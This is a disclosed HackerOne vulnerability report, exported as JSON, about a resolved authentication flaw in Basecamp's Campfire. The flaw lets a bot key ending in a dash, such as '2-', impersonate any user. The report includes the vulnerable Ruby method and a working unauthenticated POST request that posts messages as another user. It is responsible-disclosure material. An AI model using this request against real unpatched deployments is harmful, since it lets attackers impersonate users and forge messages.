{
  "id": 3329310,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzI5MzEw",
  "url": "https://hackerone.com/reports/3329310",
  "title": "Improper bot-authentication allows to impersonate any user when sending messages in a room",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2025-09-06T15:24:37.871Z",
  "submitted_at": "2025-09-06T15:24:38.403Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "is_triager?": false,
  "reporter": {
    "disabled": false,
    "username": "stackered",
    "url": "/stackered",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/vw8uf97yenmngw3n4n0pjtjla2ov/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 67,
    "url": "https://hackerone.com/basecamp",
    "handle": "basecamp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Basecamp",
      "twitter_handle": "basecamp",
      "website": "https://basecamp.com/about/policies/security/response",
      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2025-11-21T19:39:42.331Z",
  "bug_reporter_agreed_on_going_public_at": "2025-11-21T11:35:32.856Z",
  "team_member_agreed_on_going_public_at": "2025-11-21T19:39:41.759Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Bots are allowed to send messages in rooms but require a bot key to authenticate.\nThe bot key authentication function is as follows:\n\n```ruby\ndef authenticate_bot(bot_key)\n  bot_id, bot_token = bot_key.split(\"-\")\n  active.find_by(id: bot_id, bot_token: bot_token)\nend\n```\n\nThe issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` record if `bot_id` matches a valid ID.\n\nIDs are incremental, as can be seen in the rails console, so they can be guessed easily. They are also visible in some URLs.\n\n```\ncampfire(prod):038> User.active\n=> \n[#<User:0x00007a444e940f18\n  id: 1,\n  name: \"enoent\",\n  created_at: \"2025-09-06 11:59:41.505220000 +0000\",\n  updated_at: \"2025-09-06 14:08:08.788258000 +0000\",\n  role: \"administrator\",\n  email_address: \"[FILTERED]\",\n  password_digest: \"[FILTERED]\",\n  active: true,\n  bio: \"<s>ddqsdqsds</s>\",\n  bot_token: nil>,\n #<User:0x00007a444e940dd8\n  id: 2,\n  name: \"test\",\n  created_at: \"2025-09-06 13:24:29.113250000 +0000\",\n  updated_at: \"2025-09-06 13:42:26.539909000 +0000\",\n  role: \"member\",\n  email_address: \"[FILTERED]\",\n  password_digest: \"[FILTERED]\",\n  active: true,\n  bio: nil,\n  bot_token: nil>,\n #<User:0x00007a444e940c98\n```\n\nThe following request highlights the issue, as it allows an unauthenticated user to impersonate another user (here with ID `2`) and post messages on their behalf:\n\n```\nPOST /rooms/2/2-/messages HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0\nAccept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nContent-Length: 193\n\nHello ! I'm the test user, even though I'm not authenticated\n```\n\nThe attached image shows that the message was successfully posted and appears to come from the \"test\" user.\n\n## Impact\n\nAn unauthenticated user can send arbitrary messages as any user, in rooms the impersonated user have access to.",
  "bounty_amount": "2000.0",
  "formatted_bounty": "$2,000",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 4756254,
      "file_name": "message_posted.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dhgnnb2dlbrqzybkh1vspljeq1qn?response-content-disposition=attachment%3B%20filename%3D%22message_posted.png%22%3B%20filename%2A%3DUTF-8%27%27message_posted.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7CBRBPTQ%2F20251121%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251121T201509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEoaCXVzLXdlc3QtMiJGMEQCIB%2FiJ7MZ2nxtyr%2FYQ9qjf2zI76YtVl1D0LTIbLPeiu1lAiAvzSi3k1N%2BeqbHqYNzBISPERqYRpA9qIOqNhZLShsu8yqxBQgTEAMaDDAxMzYxOTI3NDg0OSIMGOZdjK9fwhkABkO0Ko4FEhR%2BBO0wqT%2FoGmbUIT7qAaOeyRURENdPNXU53Q7EZUTGZju6gIVp65E3YzlytVUrrgByWD3I0Zb0CML1uX3l5lXM9cqRc%2BKMMBpzEm4JeH4SEID0pd%2Fh9FyqPqJmyAIrBQ1N87kZNRVcxevBxuJR9ravfsV7f66R9AqQ4zNG1d7jZsCer8AZDB0dd6m6fnirkJhU%2FqEHoS4PIf%2FKv%2FzoS%2BrmRnLvPWSDRakwposHl966Cc%2BJE8S55O6%2FtFpmqFYtPiGufeOqCipmgrQrJBgSoQDQW9AjSXC%2FofRSbZHKWO3awAVlQ9kJvz9WjoUsQUfksXXhEEtNSSpFiPNW6iEmNFTbzCgbdPJQAtF9Ew%2FGUxN6HEi066A38s33SAlv8WGBsp4o9Q9pKnHE6VNiQZOJMuOIqdi7R%2FdwqqFqq60nTUEBMSJOqrDn5O%2FjmB7P6iejVQc3nYS%2FaeGGXBm8WlTiKIydU6PAWdx7On8r6PkHa2MTM6A8ue0xZUNgEdCrKrskRFkJ8HdjfmgUYcGHkvzOoJA4%2FpJ5ko32Hvy2PqgRaomS6jVUJoMlKApBoyMP4m2xKzG9HPqRL0M25cG4Fyuf7Xmr5G1Ppta%2FZdhHn0Eyy395j1i1TSrOiacDTPjHt4wvHDKYyqC2dFZk9In5my7aH6PnF5d%2FGQoLW2Ibmy09Ggx4DkNOTTCBdKa6zq%2Bx2PzcMoe0xTSgPM2hUa9B4rMQkNxHw%2Bl%2FprqNhET1Z%2Fkr98M%2FOswuDexPFF1IUUu2hsIAeKcoPYd4xCv9p3eFsEEXoIJfrbhjf13r71jSZJMsEg6i6F5Lisdj8sa82u0RePayU9mRfAMDhUiZeOEqFQdjKFrICWrSpG4Vsjm3J54AMKfEgskGOrIBPQ%2Bz4cfrTc9VcaLnKJByTNryW3SyHT9HIMOWEFH7eqSPYA1inHaXobG%2B28Kn8Eu9L%2Bxec5wMYlH8UnyQsK6cSG23mRQeA7VwE%2F13wKmm0D%2FOBf75mENW96Lk6bVBL0ua0w6wnnT%2Bqc%2Bs1iaM%2BkXTQCy%2Bp%2F5cG8DnPaAXEmTQetx%2B9kfEcItUQqL%2B9bXOfCoBDMIeuTptcoN2UbTfzajhuMHnLInlibZ%2B1XGdjmvRPbR3Mw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb1e7f8dd4eaa17917b76c71f192df36e35a0d3db58e99c82fd47bd914395c9d",
      "file_size": 48951,
      "type": "image/png",
      "moderated": false
    }
  ],
  "allow_singular_disclosure_at": "2025-12-21T11:35:33.021Z",
  "allow_singular_disclosure_after": 2560823.973285785,
  "singular_disclosure_allowed": false,
  "vote_count": 2,
  "voters": [
    "n1m0",
    "stackered"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 604232,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "ONCE: Campfire",
    "max_severity": "high"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
